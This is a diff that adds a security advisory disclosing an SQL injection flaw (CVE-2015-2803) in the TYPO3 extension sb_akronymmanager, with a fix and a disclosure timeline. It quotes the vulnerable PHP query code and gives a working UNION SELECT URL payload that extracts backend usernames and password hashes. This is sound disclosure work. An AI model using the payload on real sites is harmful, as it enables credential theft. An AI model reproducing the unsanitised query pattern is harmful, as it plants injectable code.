@@ -1,0 +1,149 @@
+Advisory: SQL Injection in TYPO3 Extension Akronymmanager
+
+An SQL injection vulnerability in the TYPO3 extension "Akronymmanager"
+allows authenticated attackers to inject SQL statements and thereby read
+data from the TYPO3 database.
+
+
+Details
+=======
+
+Product: sb_akronymmanager
+Affected Versions: <=0.5.0
+Fixed Versions: 7.0.0
+Vulnerability Type: SQL Injection
+Security Risk: medium
+Vendor URL: http://typo3.org/extensions/repository/view/sb_akronymmanager
+Vendor Status: fixed version released
+Advisory URL: https://www.redteam-pentesting.de/advisories/rt-sa-2015-002
+Advisory Status: published 
+CVE: CVE-2015-2803
+CVE URL: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-2803
+
+
+Introduction
+============
+
+"The Acronym Manager adds special explanatory markup to acronyms, abbreviations
+and foreign words on the whole site following the requirement to accessible web
+content.
+
+It provides a backend module to administer a list of words to generate new HTML
+elements for explanatory markup."
+
+(from the extension's documentation)
+
+
+More Details
+============
+
+Users with the respective privileges can maintain acronyms through the
+Akronymmanager extension pages in the TYPO3 backend web interface.
+
+In the extension's file mod1/index.php, an SQL query is generated like
+follows (line 357 and following):
+
+[...]
+$pageID = t3lib_div::_GET("id");
+if ($pageID) $where = "uid='$pageID' AND ";
+$result = $GLOBALS['TYPO3_DB']->exec_SELECTquery('title,uid', 'pages',
+    $where.'hidden="0" AND deleted="0"','sorting');
+[...]
+
+The value of the user-supplied HTTP GET parametre 'id' is used without
+sanitizing it before its use in the subsequent SQL statement. Therefore,
+attackers are able to manipulate the resulting SQL statement and inject
+their own queries into the statement.
+
+
+Proof of Concept
+================
+
+When requesting the following URL, the vulnerability is exploited to yield all
+usernames and hashes from the TYPO3 be_users database:
+
+------------------------------------------------------------------------
+http://server/typo3conf/ext/sb_akronymmanager/mod1/index.php?
+id=379%27%20UNION%20SELECT%20(SELECT%20group_concat(username,%27:%27,password)
+%20FROM%20be_users),2%20--%20
+------------------------------------------------------------------------
+
+The login credentials are then embedded in the HTML page that is
+returned: 
+
+[...]
+  <!-- Section header -->
+  <h2>user1:$hash,user2:$hash[...]</h2>
+[...]
+
+
+Workaround
+==========
+
+Only give trusted users access to the Akronymmanager extension in the
+TYPO3 backend.
+
+
+Fix
+===
+
+Upgrade the extension to version 7.0.0.
+
+
+Security Risk
+=============
+
+An attacker who has access to the backend part of the Akronymmanager
+extension may send SQL queries to the database. This can be used to read
+arbitrary tables of the TYPO3 database and may ultimately result in a
+privilege escalation if the TYPO3 users' password hashes can be cracked
+efficiently. Depending on the database configuration, it might also be
+possible to execute arbitrary commands on the database host.  As the
+attack requires an attacker who already has backend access, the
+vulnerability is estimated to pose only a medium risk.
+
+
+Timeline
+========
+
+2015-02-25 Vulnerability identified
+2015-03-04 Customer approved disclosure to vendor
+2015-03-10 CVE number requested
+2015-03-10 Vendor notified
+2015-03-26 CVE number requested again
+2015-03-31 CVE number assigned (request #2)
+2015-03-31 Vendor notified again
+2015-03-31 Vendor responded
+2015-04-08 Vendor announced fixed version available at the end of April
+2015-05-13 Requested update from vendor
+2015-05-15 Vendor requests more time
+2015-05-21 Requested update from vendor
+2015-05-22 Vendor states that upload to extension registry doesn't work
+2015-06-03 Requested update from vendor
+2015-06-10 Vendor uploads new version to extension registry
+2015-06-15 Advisory published
+
+
+
+RedTeam Pentesting GmbH
+=======================
+
+RedTeam Pentesting offers individual penetration tests performed by a
+team of specialised IT-security experts. Hereby, security weaknesses in
+company networks or products are uncovered and can be fixed immediately.
+
+As there are only few experts in this field, RedTeam Pentesting wants to
+share its knowledge and enhance the public knowledge with research in
+security-related areas. The results are made available as public
+security advisories.
+
+More information about RedTeam Pentesting can be found at
+https://www.redteam-pentesting.de.
+
+
+-- 
+RedTeam Pentesting GmbH                   Tel.: +49 241 510081-0
+Dennewartstr. 25-27                       Fax : +49 241 510081-99
+52068 Aachen                    https://www.redteam-pentesting.de
+Germany                         Registergericht: Aachen HRB 14004
+Geschäftsführer:                       Patrick Hof, Jens Liebchen
